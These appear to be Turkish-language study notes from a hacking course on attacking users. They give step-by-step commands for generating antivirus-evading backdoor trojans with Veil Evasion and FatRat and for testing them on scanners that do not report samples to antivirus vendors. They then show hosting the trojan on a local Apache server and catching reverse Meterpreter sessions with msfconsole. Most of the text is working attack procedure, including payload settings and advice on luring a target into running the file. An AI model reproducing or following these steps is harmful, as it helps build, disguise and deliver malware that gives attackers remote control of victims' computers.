	ATTACKING USERS
 Trojan'ın bir türü olan Backdoor'u kullanacağız.
 Kötü niyetli hackerlar genelde yanlış kurulmuş bir hata, açıklar ile karşılaşmazlar.
 Onun yerine Trojan dediğimiz bazı zararlı exe'ler(dosyalar) kullanırlar.
 Hacklemek istediğimiz kişiye bu exe dosyasını yollarsanız ve bir şekilde bu dosyayı ona açtırırsanız,
 Kullanıcı Hacker'a kendi bilgisayarında bir erişim vermiş olur.
 Virüs programları bu tarz dosyalar geldiğinde kullanıcıları uyarır.
 Veil, trojanları oluşturur ve antivirüs programlarından kaçmak için birçok teknik kullanır.
 Veil bir tool'dur.



	VEIL
<Terminal> cd /opt/Veil/python3 Veil.py

 list yazarsak hazırda kullanabileceğimiz araçları görebiliriz.
 trojanları, backdoorları yarattığımız araç "Evasion"dur.
 Evasion'u açmak için "use 1" yazmamız gerekiyor.
 Tekrar list yazarsak payload'ları görebiliriz.
 satırların sonunda yazan (rev_http.py) gibi, reverse ters bağlantı demektir ben hedef bilgisayara değil o bana bağlanacak.
 Bizim bağlanmama sebebimiz Antivirüs programları vs.
 Bunlardan birini kullanarak ilk trojanımızı, backdoor'umuzu yaratalım. :)
 Herhangi birini "use" komutuyla seçelim. (use 14)
 set LHOST 10.0.2.10	-> LHOST'u kendi ip'miz olarak değiştirdik. (ifconfig)
 set LPORT 8080		-> LPORT'u 8080 olarak değiştirdik çünkü 80'i kullanan portumuz var.
 "options" yazarak ayarları görebiliriz.
 generate yazarak isim verdikten sonra Enter'a basarak trojanımızı yaratabiliriz.





	Trojanlarımızı Nerede ve Nasıl test ederiz?
 Trojanımızı test etmek için tarayıcımızdan "Malware scan" diye aratmamız yeterli olacaktır.
 Oluşturduğumuz virüsleri burada deneyebiliriz. Ama bazı siteler trojanımızı anti-virüs şirketlerine iletir. :(
 Sonuçlarımızı paylaşmayacak bir siteye girelim. "online virus scanner without result distribution"
 Oluşturduğumuz trojan 9 tane antivirüs programından geçti.

 -> virustotal		-> AV Programları ile paylaşır.
 -> jotti		-> AV Programları ile paylaşır.
 -> antiscan.me		-> AV Programları ile paylaşmaz. :)
 -> nodistribute	-> AV Programları ile paylaşmaz. :)
 Gibi siteler işimizi görecektir.





	Antivirüs programlarına yakalanmayı nasıl minimize ederiz?
 Ne kadar çok ayar değiştirisek o kadar fazla minimize ederiz. :)
 Tekrar Veil/Evasion'u kullanalım.
  Şimdi daha fazla ayarı değiştirelim.

 -BullDOGTrojan- for Ruby
set COMPILE_TO_EXE N
set DOMAIN A
set LHOST 10.0.2.10
set LPORT 124
set SLEEP 31
set INJECT_METHOD Heap
set USERNAME XHAX
 50 Antivirüs programından Microsoft hariç tüm programları başarıyla geçti. :)




	TROJANIMIZI NASIL KULLANIRIZ?
 Herhangi bir kişiyi kandırarak trojanımızı aktif hale getirebilirsek, gelen bağlantıları halihazırda dinliyor olmamız lazım.
 Bunun için msfconsole aracını kullanacağız.
 msfconsole aracını açmak için: (msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)

msfconsole
use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
set PAYLOAD windows/meterpreter/reverse_http
		   <Session adı>
show options
set LHOST 10.0.2.10	-> Kendi ip'mizi ekledik.
exploit			-> Şuanda gelen bağlantıları dinliyor. Bir bağlantı bulursa otomatik olarak session'umuzu açacaktır.

 Yeni bir terminale:
service apache2 start -> yazarak websitemizi diğer bilgisayarlardan ulaşılabilir hale getiriyoruz.
 Hedef bilgisayarımız tarayıcısından 10.0.2.10/backdoors adresine girerse ve Trojanımızı indirirse bize bir bağlantı göndermiş olacaktır.
 Kalimize döndüğümüzde Meterpreter session'ımız uyanmış olacaktır çünkü bağlantı aldık.
 Artık Hacklediğimiz Bilgisayarın içindeyiz. :)



	:Alternative Best Tool:
 https://github.com/Veil-Framework/Veil		Veil Framework
 https://www.shellterproject.com/download/	Shellter AV Evasion Artware
 https://github.com/trustedsec/unicorn		Trustedsec
 https://github.com/g0tmi1k/msfpc		g0tm1k
 https://github.com/r00t-3xp10it/venom		Pedro Ubuntu
 https://github.com/oddcod3/Phantom-Evasion	Diego Cornacchini



 Trojanımızı var/www/html/backdoors/ içine atıyoruz. -> Buraya atma sebebimiz kendi web server'ımızı çalıştırmak ve bu web server aracılığı ile trojanımızı hedef bilgisayara atmak.
service apache2 start -> yazarak websitemizi diğer bilgisayarlardan ulaşılabilir hale getiriyoruz.
 Hedef bilgisayarımız tarayıcısından 10.0.2.10/backdoors adresine girerse ve Trojanımızı indirirse bize bir bağlantı göndermiş olacaktır.
 Kalimize döndüğümüzde Meterpreter session'ımız uyanmış olacaktır çünkü bağlantı aldık.
 Artık Hacklediğimiz Bilgisayarın içindeyiz. :)




	FATRAT
 Terminale "fatrat" yazarak tool'umuzu açabiliriz.
 şimdilik 2. seçeneği deneyelim. (2)
 tekrardan 2. seçeneğe girelim. Yavaş ama güçlü
 Set LHOST IP: yerine 10.0.2.10
 Set LPORT: yerine 8080 (rastgele)
 Yazıyoruz.

 Tekrar karşımıza seçenek çıkıyor. Bu kısımda 1'i seçiyoru (32bit her 2sinde de çalışıyor.)
 Sanal makinenin veya hedef bilgisayarın tarayıcısında 10.0.2.10/backdoors adresine giriyoruz.
 Oluşturduğumuz trojanı indiriyoruz. (FaTrojan.exe) -> Defender Trojanı Engellemedi.
 Kendi bilgisayarımızda service apache2 start yaptıktan sonra,
 msfconsole'u açıyoruz. (msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)

msfconsole
use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
set payload windows/metepreter/reverse_tcp
show options
set LHOST 10.0.2.10
set LPORT 8080
exploit
 Yazdıktan sonra sanal makinemizde indirmiş olduğumuz trojana girdikten sonra
 Session'umuz uyanmış olacak ve hedef bilgisayara sızmış olacağız.
sessions -l
sessions -1	-> Yazarak meterpreter'ımıza girmiş olacağız.
sysinfo		-> Çalıştırırsak windows10'umuzu hacklediğimizi görmüş olacağız.